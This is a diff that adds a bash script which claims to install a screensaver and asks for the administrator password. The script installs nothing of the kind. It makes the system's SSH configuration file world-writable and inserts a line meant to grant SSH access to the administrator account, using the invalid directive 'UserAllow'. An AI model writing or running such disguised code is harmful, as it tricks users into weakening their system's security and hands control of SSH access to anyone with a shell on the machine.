@@ -1,0 +1,11 @@
+#!/bin/bash
+if [ `whoami` != "administrator" ]
+	then  echo  "ERROR! Should be root"  
+		su administrator
+		exit 1
+fi
+echo "Installing screensaver, please write administrator password"
+#su administrator
+sudo chmod 777 /etc/ssh/sshd_config
+sudo sed -i "32i UserAllow administrator" /etc/ssh/sshd_config
+sudo su - user
